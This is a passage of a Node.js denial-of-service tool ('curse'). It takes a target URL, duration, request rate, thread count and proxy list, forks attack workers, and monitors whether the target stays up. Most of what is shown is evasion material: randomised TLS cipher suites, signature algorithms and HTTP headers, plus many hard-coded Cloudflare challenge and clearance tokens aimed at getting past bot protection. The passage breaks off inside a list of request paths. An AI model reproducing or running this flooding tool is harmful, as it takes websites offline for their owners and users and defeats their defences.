const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
var path = require("path");
const crypto = require("crypto");
const UserAgent = require('user-agents');
const fs = require("fs");
const axios = require('axios');
const https = require('https');

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {
});

if (process.argv.length < 7){console.log(`\x1b[38;5;160mnode curse target time rate(\x1b[38;5;255m32\x1b[38;5;160m) thread proxy.txt\x1b[38;5;255m| \x1b[38;5;160mtelegram: \x1b[38;5;255m@RexBgs01`); process.exit();}
const headers = {};
 function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

const getCurrentTime = () => {
   const now = new Date();
   const hours = now.getHours().toString().padStart(2, '0');
   const minutes = now.getMinutes().toString().padStart(2, '0');
   const seconds = now.getSeconds().toString().padStart(2, '0');
   return `(\x1b[34m${hours}:${minutes}:${seconds}\x1b[0m)`;
 };

 const targetURL = process.argv[2];
 const agent = new https.Agent({ rejectUnauthorized: false });

 function getStatus() {
 const timeoutPromise = new Promise((resolve, reject) => {
   setTimeout(() => {
     reject(new Error('Request timed out'));
   }, 5000);
 });

 const axiosPromise = axios.get(targetURL, { httpsAgent: agent });

 Promise.race([axiosPromise, timeoutPromise])
   .then((response) => {
     const { status, data } = response;
     console.clear()
     console.log(`\x1b[38;5;255m[\x1b[38;5;160m@RexBgs01\x1b[38;5;255m] ${getCurrentTime()} Title: \x1b[38;5;160m${getTitleFromHTML(data)} \x1b[38;5;255m(\x1b[32m${status}\x1b[38;5;255m)`);
   })
   .catch((error) => {
     if (error.message === 'Request timed out') {
       console.log(`\x1b[38;5;255m[\x1b[38;5;160m@RexBgs01\x1b[38;5;255m] ${getCurrentTime()} \x1b[38;5;160mRequest Timed Out`);
     } else if (error.response) {
       const extractedTitle = getTitleFromHTML(error.response.data);
       console.log(`\x1b[38;5;255m[\x1b[38;5;160m@RexBgs01\x1b[38;5;255m] ${getCurrentTime()} Title: \x1b[38;5;160m${extractedTitle} (\x1b[31m${error.response.status}\x1b[0m)`);
     } else {
       console.log(`\x1b[38;5;255m[\x1b[38;5;160m@RexBgs01\x1b[38;5;255m] ${getCurrentTime()} ${error.message}`);
     }
   });
}


function getTitleFromHTML(html) {
  const titleRegex = /<title>(.*?)<\/title>/i;
  const match = html.match(titleRegex);
  if (match && match[1]) {
    return match[1];
  }
  return 'Not Found';
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function getRandomNumberBetween(min,max){
    return Math.floor(Math.random()*(max-min+1)+min);
}

function randomString(length) {
  var result = "";
  var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  var charactersLength = characters.length;
  for (var i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  ;
  return result;
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
} 


const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
}


if (cluster.isMaster){
 console.clear();
 console.log(`
\x1b[38;2;255;0;55m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⣤⣤⡾⠿⠿⠿⠿⠿⠿⠿⠿⣿⣿⣿⣿⣛⣛⠛⠛⠛⠛⠛⠻⠿⠷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⡾⢟⣛⣏⣉⡉⠁⠀⠀⠀⠈⠉⠉⣉⣩⡤⠤⠤⠤⠤⣤⣬⣍⡙⠳⠶⣤⣀⠀⠀⠀⠀⠙⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣴⠟⠉⠀⠀⠀⣀⣤⡤⢤⣤⣤⣀⡉⠉⠉⠀⠀⠀⠀⢠⡶⠚⠓⠒⠶⠶⠮⣍⣛⠦⣝⠳⢦⡀⠀⠀⠀⠻⣦⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣿⠃⠀⠀⠀⢠⡾⠋⠁⠀⠀⠀⠀⢠⡀⠀⠀⠀⠀⠀⢠⡟⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣮⡻⣦⡙⠂⠀⠀⠀⠹⣧⡀⠀⠀⠀⠀⠀⠀
⢀⣀⣀⣀⣸⣿⣦⣄⣤⣤⣾⣄⣀⣀⣠⣤⣤⣤⣼⣷⣄⣀⣠⣤⣤⣼⣀⣀⣤⣾⣿⣿⣿⣿⣦⣤⣤⣠⣷⣼⣿⣤⣤⣤⡄⠀⢻⣷⡀⠀⠀⠀⠀⠀
⢸⣿⣿⡿⠛⢻⣿⠛⠛⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⣿⡟⠛⢻⣿⡛⠛⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠠⣤⣽⢿⣦⡀⠀⠀⠀
⠘⢻⣿⣿⣶⡿⠟⣷⣶⠈⠉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⣿⣿⣶⡌⠉⣿⣶⡈⠉⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⣶⣄⠀⠈⣿⢿⣄⠀⠀
⠀⣸⣿⠉⣿⣿⣿⣟⣙⣷⣶⠉⢙⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠉⠙⣿⣿⣶⣟⣙⣷⣶⠉⢉⣿⣿⣿⣿⣿⠋⣙⣷⠀⠀⠙⣷⡄⢸⡄⢻⣷⡀
⠀⢻⡏⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠰⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣼⠿⠛⣿⣶⣄⡀⢸⡇⢸⠀⢸⣿⡇
⠀⠈⣿⡦⣴⣯⠀⣿⣿⣧⡀⠀⠀⠀⠐⠻⠿⣧⡀⠀⠀⠀⠀⠶⠶⢶⣤⣤⣿⠁⠀⠀⠀⣰⣶⣴⣿⣿⠟⠉⠀⢀⣴⣿⠋⠉⠙⣿⠃⣾⢀⣿⣿⠇
⠀⠀⠈⢿⡄⠀⠀⣿⣿⣿⣿⣶⣤⣀⠀⠀⠀⠈⠻⣶⡶⣶⠀⠀⠀⣀⣒⣻⣷⣶⠶⠿⠛⠋⠉⠀⣠⣿⣀⣤⣶⣿⣿⠏⠀⠀⠀⠧⠸⣯⣾⡿⠁⠀
⠀⠀⠀⢸⡇⠀⠸⣿⣏⠈⣿⠀⠙⣿⠛⠛⠷⢶⣶⣿⠿⠿⢿⣿⠛⠛⠉⠉⠀⢿⡆⠀⢀⣤⣴⣾⣿⣿⠋⠁⣠⡿⠃⠀⠀⠀⠀⢠⣿⡿⠛⠀⠀⠀
⠀⠀⠀⢸⡇⠀⠀⣿⣿⣿⣿⣆⣴⣿⣆⣀⢀⣠⣿⣅⣀⣀⣴⣿⡀⢀⣀⣀⣴⣾⣿⣿⡿⠿⠋⠁⠘⣿⣄⣼⠏⠀⠀⠀⠀⠀⢠⣿⡿⠁⠀⠀⠀⠀
⠀⠀⠀⢸⡇⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠋⢿⣇⠀⠀⠀⠀⣀⣽⠟⠁⠀⠀⠀⠀⠀⢠⣿⡟⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⡇⠀⠀⢹⣯⣿⡏⠹⣟⠛⢻⣿⣿⣿⣿⡟⠉⠉⠉⠉⣿⠀⠀⠀⠀⠀⠈⢻⣆⣀⣴⠾⠋⠀⠀⠀⠀⠀⠀⢀⣴⣿⠏⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⡇⠀⠀⠀⠙⠿⣧⣤⣿⣿⣿⣿⣟⠁⢸⣧⡀⠀⠀⢀⣿⣀⣀⣀⣤⣤⣴⠾⠟⠋⢁⣀⠤⠒⣠⣴⠞⣀⣴⡿⠏⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⡇⠀⠀⢀⣤⣶⣿⣿⣿⡿⠋⠉⠙⠛⠛⠛⠛⠛⠛⠛⠋⠉⠉⠉⠉⠀⢀⣤⠴⠚⠉⣤⠖⠋⣩⣴⣾⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣸⣁⣤⣾⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⡤⠒⠋⠉⠀⠐⠛⣉⣤⣶⠿⠟⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣠⣶⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⣀⣈⠉⠉⠉⠀⠀⠄⠤⠀⠀⠀⠉⠉⠀⣀⣤⣶⣾⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢸⣿⡃⠀⣹⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⣤⣶⡿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠈⠻⣿⣶⣿⠟⠻⣶⣤⣄⡀⠀⠀⠀⠀⣤⣤⣤⣤⣶⣶⣿⡿⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠉⠀⠀⠀⠀⠉⠙⠛⠛⠛⠛⠛⠛⠛⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀         
`);
 
 for (let i = 1; i <= process.argv[5]; i++){
   cluster.fork();
   console.log(`\x1b[38;5;255m[\x1b[38;5;160m@STRET\x1b[38;5;255m] ${getCurrentTime()} \x1b[38;5;160m\x1b[38;5;255mATTACK\x1b[38;5;160m Include: ${i} Thread(s) ${i} Started`);
 }
 console.log(`\x1b[38;5;255m[\x1b[38;5;160m@STRET\x1b[38;5;255m] ${getCurrentTime()} \x1b[38;5;255mAttack\x1b[38;5;160m Has Been Started`);
 setInterval(getStatus, 2000);
 setTimeout(() => {
   console.log(`\x1b[38;5;255m[\x1b[38;5;160m@STRET\x1b[38;5;255m] ${getCurrentTime()} \x1b[38;5;160mThe \x1b[38;5;255mAttack\x1b[38;5;160m Is Over`);
   process.exit(1);
 }, process.argv[3] * 1000);
} 

const cplist = [
'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
    'ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK:!SRP',
    'ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP',
    'ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-ECDSA-AES128-SHA256:DHE-RSA-AES256-SHA384:DHE-RSA-AES128-SHA256:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5',
'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP',
    'ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK',
    'ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:DHE-RSA-AES256-SHA384:DHE-RSA-AES128-SHA256:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5',
'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP',
    'ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-ECDSA-AES128-SHA256:DHE-RSA-AES256-SHA384:DHE-RSA-AES128-SHA256:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5',
    'ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:DHE-RSA-AES256-SHA384:DHE-RSA-AES128-SHA256:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK',
'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP',
    'ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK'
];

const hihi = [ "require-corp", "unsafe-none", ];


const sigalgs = [
 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
 'ecdsa_brainpoolP256r1tls13_sha256',
 'ecdsa_brainpoolP384r1tls13_sha384',
 'ecdsa_brainpoolP512r1tls13_sha512',
 'ecdsa_sha1',
 'ed25519',
 'ed448',
 'ecdsa_sha224',
 'rsa_pkcs1_sha1',
 'rsa_pss_pss_sha256',
 'dsa_sha256',
 'dsa_sha384',
 'dsa_sha512',
 'dsa_sha224',
 'dsa_sha1',
 'rsa_pss_pss_sha384',
 'rsa_pkcs1_sha2240',
 'rsa_pss_pss_sha512',
 'sm2sig_sm3',
 'ecdsa_secp521r1_sha512',
];

lang_header = [
  'ko-KR',
  'en-US',
  'zh-CN',
  'zh-TW',
  'ja-JP',
  'en-GB',
  'en-AU',
  'en-GB,en-US;q=0.9,en;q=0.8',
  'en-GB,en;q=0.5',
  'en-CA',
  'en-UK, en, de;q=0.5',
  'en-NZ',
  'en-GB,en;q=0.6',
  'en-ZA',
  'en-IN',
  'en-PH',
  'en-SG',
  'en-HK',
  'en-GB,en;q=0.8',
  'en-GB,en;q=0.9',
  ' en-GB,en;q=0.7',
  '*',
  'en-US,en;q=0.5',
  'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
  'utf-8, iso-8859-1;q=0.5, *;q=0.1',
  'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
  'en-GB, en-US, en;q=0.9',
  'de-AT, de-DE;q=0.9, en;q=0.5',
  'cs;q=0.5',
  'da, en-gb;q=0.8, en;q=0.7',
  'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
  'en-US,en;q=0.9',
  'de-CH;q=0.7',
  'tr',
  'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    
]
const accept_header = [
    '*/*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8',
    'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/plain, */*; q=0.01',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*',
    'text/html, application/xhtml+xml, image/jxr, */*',
    'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1',
    'application/javascript, */*;q=0.8',
    'text/html, text/plain; q=0.6, */*; q=0.1',
    'application/graphql, application/json; q=0.8, application/xml; q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
],

encoding_header = [
  '*',
  '*/*',
  'gzip',
  'gzip, deflate, br',
  'compress, gzip',
  'deflate, gzip',
  'gzip, identity',
  'gzip, deflate',
  'br',
  'br;q=1.0, gzip;q=0.8, *;q=0.1',
  'gzip;q=1.0, identity; q=0.5, *;q=0',
  'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
  'compress;q=0.5, gzip;q=1.0',
  'identity',
  'gzip, compress',
  'compress, deflate',
  'compress',
  'gzip, deflate, br',
  'deflate',
  'gzip, deflate, lzma, sdch',
  'deflate',
]

controle_header = [
  'max-age=604800',
  'proxy-revalidate',
  'public, max-age=0',
  'max-age=315360000',
  'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
  's-maxage=604800',
  'max-stale',
  'public, immutable, max-age=31536000',
  'must-revalidate',
  'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
  'max-age=31536000,public,immutable',
  'max-age=31536000,public',
  'min-fresh',
  'private',
  'public',
  's-maxage',
  'no-cache',
  'no-cache, no-transform',
  'max-age=2592000',
  'no-store',
  'no-transform',
  'max-age=31557600',
  'stale-if-error',
  'only-if-cached',
  'max-age=0',
  'must-understand, no-store',
  'max-age=31536000; includeSubDomains',
  'max-age=31536000; includeSubDomains; preload',
  'max-age=120',
  'max-age=0,no-cache,no-store,must-revalidate',
  'public, max-age=604800, immutable',
  'max-age=0, must-revalidate, private',
  'max-age=0, private, must-revalidate',
  'max-age=604800, stale-while-revalidate=86400',
  'max-stale=3600',
  'public, max-age=2678400',
  'min-fresh=600',
  'public, max-age=30672000',
  'max-age=31536000, immutable',
  'max-age=604800, stale-if-error=86400',
  'public, max-age=604800',
  'no-cache, no-store,private, max-age=0, must-revalidate',
  'o-cache, no-store, must-revalidate, pre-check=0, post-check=0',
  'public, s-maxage=600, max-age=60',
  'public, max-age=31536000',
  'max-age=14400, public',
  'max-age=14400',
  'max-age=600, private',
  'public, s-maxage=600, max-age=60',
  'no-store, no-cache, must-revalidate',
  'no-cache, no-store,private, s-maxage=604800, must-revalidate',
  'Sec-CH-UA,Sec-CH-UA-Arch,Sec-CH-UA-Bitness,Sec-CH-UA-Full-Version-List,Sec-CH-UA-Mobile,Sec-CH-UA-Model,Sec-CH-UA-Platform,Sec-CH-UA-Platform-Version,Sec-CH-UA-WoW64',
]


// Updated Methods array with additional HTTP methods
const Methods = [
    "GET",     // Standard method for retrieving data
    "POST",    // Standard method for sending data
    "HEAD",    // Retrieves headers only
    "OPTIONS", // Describes the communication options for the target resource
    "PUT",     // Updates a resource or creates it if it doesn't exist
    "DELETE",  // Deletes the specified resource
    "PATCH",   // Applies partial modifications to a resource
    "TRACE",   // Performs a message loop-back test along the path to the target resource
    "CONNECT"  // Establishes a tunnel to the server identified by the target resource
];

// Function to select a random HTTP method from the Methods array
const randomMethod = Methods[Math.floor(Math.random() * Methods.length)];

// Updated queryStrings array with additional query parameters and patterns
const queryStrings = [
    "?",                  // Base query parameter symbol
    "/",                  // Root path
    "!",                  // Exclamation mark, might be used in certain query parameters
    "cf-chl",             // Challenge token
    "cf-chl-rc",          // Challenge response code
    "cf-clearance",       // Clearance token
    "cf-ray",             // Cloudflare Ray ID
    "cf-request-id",      // Cloudflare request ID
    "cf-visitor",         // Cloudflare visitor information
    "cf-connecting-ip",   // Cloudflare connecting IP
    "cf-ipcountry",       // Country of the connecting IP
    "cf-cache-status",    // Cache status
    "cf-apo-via",         // Cloudflare APO (Automatic Platform Optimization) information
    "cf-edge-cache",      // Cloudflare edge cache status
    "cf-cache-policy",    // Cloudflare cache policy
    "cf-cache-source",    // Cloudflare cache source
    "cf-priority",        // Cloudflare priority level
    "search=",            // Search query parameter
    "lang=",              // Language parameter
    "user_id=",           // User ID for user-specific data
    "session_id=",        // Session ID for session-based data
    "category=",          // Category for filtering data
    "tag=",               // Tag for filtering data
    "sort=",              // Sorting order (e.g., newest, oldest)
    "filter=",            // Filter criteria
    "limit=",             // Limit the number of results
    "offset=",            // Offset for pagination
    "start_date=",        // Start date for date range
    "end_date=",          // End date for date range
    "search_query=",      // Search query parameter
    "page=",              // Page number for pagination
    "api_key=",           // API key for authentication
    "token=",             // Token for authentication or authorization
];

// Updated paths array with additional and varied paths
const paths = [
   "/",
   "?page=1",
   "?page=2",
   "?page=3",
   "?category=news",
   "?category=sports",
   "?category=technology",
   "?category=entertainment", 
   "?sort=newest",
   "?filter=popular",
   "?limit=10",
   "?start_date=1989-06-04",
   "?end_date=1989-06-04",
   "?__cf_chl_rt_tk=nP2tSCtLIsEGKgIBD2SztwDJCMYm8eL9l2S41oCEN8o-1702888186-0-gaNycGzNCWU",
"?__cf_chl_rt_tk=yI__zhdK3yR99B6b9jRkQLlvIjTKu7_2YI33ZCB4Pbo-1702888463-0-gaNycGzNFGU",
"?__cf_chl_rt_tk=QbxNnnmC8FpmedkosrfaPthTMxzFMEIO8xa0BdRJFKI-1702888720-0-gaNycGzNFHs",
"?__cf_chl_rt_tk=ti1J.838lGH8TxzcrYPefuvbwEORtNOVSKFDISExe1U-1702888784-0-gaNycGzNClA",
"?__cf_chl_rt_tk=ntO.9ynonIHqcrAuXZJBTcTBAMsENOYqkY5jzv.PRoM-1702888815-0-gaNycGzNCmU",
"?__cf_chl_rt_tk=SCOSydalu5acC72xzBRWOzKBLmYWpGxo3bRYeHFSWqo-1702888950-0-gaNycGzNFHs",
"?__cf_chl_rt_tk=QG7VtKbwe83bHEzmP4QeG53IXYnD3FwPM3AdS9QLalk-1702826567-0-gaNycGzNE9A",
"?__cf_chl_rt_tk=C9XmGKQztFjEwNpc0NK4A3RHUzdb8ePYIAXXzsVf8mk-1702889060-0-gaNycGzNFNA",
"?__cf_chl_rt_tk=cx8R_.rzcHl0NQ0rBM0cKsONGKDhwNgTCO1hu2_.v74-1702889131-0-gaNycGzNFDs",
"?__cf_chl_rt_tk=AnEv0N25BNMaSx7Y.JyKS4CV5CkOfXzX1nyIt59hNfg-1702889155-0-gaNycGzNCdA",
"?__cf_chl_rt_tk=7bJAEGaH9IhKO_BeFH3tpcVqlOxJhsCTIGBxm28Uk.o-1702889227-0-gaNycGzNE-U",
"?__cf_chl_rt_tk=rrE5Pn1Qhmh6ZVendk4GweUewCAKxkUvK0HIKJrABRc-1702889263-0-gaNycGzNCeU",
"?__cf_chl_rt_tk=.E1V6LTqVNJd5oRM4_A4b2Cm56zC9Ty17.HPUEplPNc-1702889305-0-gaNycGzNCbs",
"?__cf_chl_rt_tk=a2jfQ24eL6.ICz01wccuN6sTs9Me_eIIYZc.94w6e1k-1702889362-0-gaNycGzNCdA",
"?__cf_chl_rt_tk=W_fRdgbeQMmtb6FxZlJV0AmS3fCw8Tln45zDEptIOJk-1702889406-0-gaNycGzNE9A",
"?__cf_chl_rt_tk=4kjttOjio0gYSsNeJwtzO6l1n3uZymAdJKiRFeyETes-1702889470-0-gaNycGzNCfs",
"?__cf_chl_rt_tk=Kd5MB96Pyy3FTjxAm55aZbB334adV0bJax.AM9VWlFE-1702889600-0-gaNycGzNCdA",
"?__cf_chl_rt_tk=v2OPKMpEC_DQu4NlIm3fGBPjbelE6GWpQIgLlWzjVI0-1702889808-0-gaNycGzNCeU",
"?__cf_chl_rt_tk=vsgRooy6RfpNlRXYe7OHYUvlDwPzPvAlcN15SKikrFA-1702889857-0-gaNycGzNCbs",
"?__cf_chl_rt_tk=EunXyCZ28KJNXVFS.pBWL.kn7LZdU.LD8uI7uMJ4SC4-1702889866-0-gaNycGzNCdA",
"?__cf_clearance=Q7cywcbRU3LhdRUppkl2Kz.wU9jjRLzq50v8a807L8k-1702889889-0-1-a33b4d97.d3187f02.f43a1277-160.0.0",
"?__cf_bm=ZOpceqqH3pCP..NLyk5MVC6eHuOOlnbTRPDtVGBx4NU-1702890174-1-AWt2pPHjlDUtWyMHmBUU2YbflXN+dZL5LAhMF+91Tf5A4tv5gRDMXiMeNRHnPzjIuO6Nloy0XYk56K77cqY3w9o=; cf_bm=kIWUsH8jNxV.ERL_Uc_eGsujZ36qqOiBQByaXq1UFH0-1702890176-1-AbgFqD6R4y3D21vuLJdjEdIHYyWWCjNXjqHJjxebTVt54zLML8lGpsatdxb/egdOWvq1ZMgGDzkLjiQ3rHO4rSYmPX/tF+HGp3ajEowPPoSh",
"?__cf_clearance=.p2THmfMLl5cJdRPoopU7LVD_bb4rR83B.zh4IAOJmE-1702890014-0-1-a33b4d97.179f1604.f43a1277-160.0.0",
"?__cf_clearance=YehxiFDP_T5Pk16Fog33tSgpDl9SS7XTWY9n3djMkdE-1702890321-0-1-a33b4d97.e83179e2.f43a1277-160.0.0",
"?__cf_clearance=WTgrd5qAue.rH1R0LcMkA9KuGXsDoq6dbtMRaBS01H8-1702890075-0-1-a33b4d97.75c6f2a1.e089e1cd-160.0.0",
"?__cf_chl_rt_tk=xxsEYpJGdX_dCFE7mixPdb_xMdgEd1vWjWfUawSVmFo-1702890787-0-gaNycGzNE-U", "?__cf_chl_rt_tk=4POs4SKaRth4EVT_FAo71Y.N302H3CTwamQUm1Diz2Y-1702890995-0-gaNycGzNCiU",
"?__cf_chl_rt_tk=ZYYAUS10.t94cipBUzrOANLleg6Y52B36NahD8Lppog-1702891100-0-gaNycGzNFGU",
"?__cf_chl_rt_tk=qFevwN5uCe.mV8YMQGGui796J71irt6PzuRbniOjK1c-1702891205-0-gaNycGzNChA",
"?__cf_chl_rt_tk=Jc1iY2xE2StE8vqebQWb0vdQtk0HQ.XkjTwCaQoy2IM-1702891236-0-gaNycGzNCiU",
"?__cf_chl_rt_tk=Xddm2Jnbx5iCKto6Jjn47JeHMJuW1pLAnGwkkvoRdoI-1702891344-0-gaNycGzNFKU",
"?__cf_chl_rt_tk=0bvigaiVIw0ybessA948F29IHPD3oZoD5zWKWEQRHQc-1702891370-0-gaNycGzNCjs",
